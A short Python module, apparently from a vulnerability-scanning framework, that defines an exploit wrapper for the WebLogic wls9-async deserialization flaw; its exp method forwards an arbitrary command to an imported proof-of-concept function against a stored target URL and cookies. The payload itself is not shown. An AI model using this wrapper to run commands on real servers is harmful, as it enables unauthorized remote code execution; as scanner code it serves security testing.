# -*- coding:utf-8 -*-
# weblogic_wls9-async反序列化
from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from .weblogic_wls9_poc import POC


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln


    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        return poc.wls9_cmd(self.vuln.url, cmd, "exp", self.vuln.specify)